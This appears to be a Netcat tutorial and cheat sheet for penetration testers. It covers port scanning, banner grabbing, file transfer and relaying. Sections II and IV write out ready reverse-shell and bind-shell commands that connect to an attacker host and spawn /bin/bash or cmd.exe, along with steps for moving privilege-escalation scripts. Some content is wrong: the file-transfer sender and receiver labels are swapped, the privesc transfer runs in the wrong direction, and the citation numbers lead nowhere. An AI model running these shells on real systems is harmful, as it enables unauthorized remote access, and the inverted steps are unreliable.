# NetCat

## The Netcat (nc) Masterclass: Professional Networking, Security, and Automation

Netcat (nc), often called the "Swiss Army Knife" of networking, is an essential command-line tool for security professionals, penetration testers, red teams, and sysadmins. It enables rapid testing and manipulation of TCP/UDP connections, banner grabbing, port scanning, file transfers, persistence mechanisms, and shell spawning.

***

### I. Core Capabilities & Workflow

* **TCP/UDP Client and Server:** Connect to any remote port and listen on any local port, supporting both TCP and UDP.\[1]\[2]\[3]
* **Banner Grabbing & Service Discovery:** Collect banners or test server responses for reconnaissance and enumeration.\[4]\[5]
* **File Transfers:** Move files between systems on arbitrary ports, including in environments lacking advanced tools.\[6]\[4]
* **Shell Spawning & Reverse Shells:** Obtain command execution on remote hosts for post-exploitation, lateral movement, or C2 operations.\[5]\[7]
* **Port Scanning & Network Diagnostics:** Scan open ports or test firewall rules quickly.\[6]
* **Proxying, Relaying, and Tunneling:** Forward connections or create simple network relays for pivoting or bypassing controls.\[3]\[8]
* **Integration & Automation:** Combines easily with bash or batch scripts, enabling custom, automated security tasks.\[7]\[8]\[3]

***

### II. Professional Usage Examples

#### Basic Connectivity

```bash
# Connect to remote host (TCP)
nc example.com 80

# Listen for connections on port 1337 (TCP)
nc -l -p 1337

```

#### File Transfer

**Sender:**

```bash
nc -l -p 4444 > received.txt

```

**Receiver:**

```bash
nc host 4444 < file.txt

```

#### Banner Grabbing

```bash
nc -v target.com 22

```

#### Simple Chat Server (multi-client possible with scripting)

**Server:**

```bash
nc -l -p 12345

```

**Client:**

```bash
nc serverip 12345

```

#### Reverse Shell

**On Attacker:**

```bash
nc -l -p 4444 -vvv

```

**On Victim (Linux):**

```bash
nc attacker_ip 4444 -e /bin/bash

```

**On Victim (Windows):**

```bash
nc attacker_ip 4444 -e cmd.exe

```

> (Reverse shell options may require a specific nc version and should be used only with authorization.)\[5]

#### Bind Shell

**On Victim:**

```bash
nc -l -p 5555 -e /bin/bash

```

**On Attacker:**

```bash
nc target_ip 5555

```

#### Port Scan

```bash
nc -zv target.com 20-1024

```

(-z for scan, -v for verbose.)

#### UDP Connectivity

```bash
# Listen for UDP
nc -u -l -p 9999

# Send via UDP
nc -u host 9999

```

#### Relaying/Proxy

```bash
# Forward local port 3000 to example.com:80
nc -l 3000 | nc example.com 80

```

***

### III. Advanced Scenarios

* **Scripting/Automation:** Combine with bash, Python, or PowerShell for automated exploitation, persistence, or custom C2 workflows.\[3]
* **Port Knocking:** Sequence of nc probes to trigger or maintain access, useful for stealthy remote access scripts.\[3]
* **Pivoting:** Use in conjunction with SSH tunnels or on compromised hosts for lateral network movement.\[3]
* **Network Recon/Breach Proof:**
  * Test service reachability through firewalls even where telnet/nmap is blocked.
  * Feed output directly into grep/awk or remote logging for evidence.\[7]\[6]

***

### IV. Real-World Workflow Example

1. **Enumerate Open Services**

```bash
nc -zv target 20-1024

```

1. **Capture Reverse Shell from Internal Host**

```bash
nc -l -p 4444 -vvv
# On target: nc attacker 4444 -e /bin/bash

```

1. **Automatically Transfer PrivEsc/Exploit Scripts**

```bash
nc -l -p 8888 > privchecker.sh
# On target: nc attacker_ip 8888 < privchecker.sh

```

1. **Proxy HTTP Requests for Bypass/Relay**

```bash
nc -l 8080 | nc target.com 80

```

### V. Pro Tips & Best Practices

* Always operate with explicit permission; misuse can violate laws and ethics.\[9]\[7]
* Use verbose `v`/`vvv` for debugging or reporting session details.
* Know your netcat variant (ncat, traditional, OpenBSD, GNU) as flags and features vary across environments.
* Always confirm shell and file transfer reliability before using on production/engagement scopes.\[4]\[5]
* Integrate with log files for audit, proof of access, or forensic review.\[4]\[6]
* Pair with traffic capture (tcpdump, Wireshark) for full network and payload analysis.
* Clean up listeners/shells and sanitize environments post-engagement for operational security.
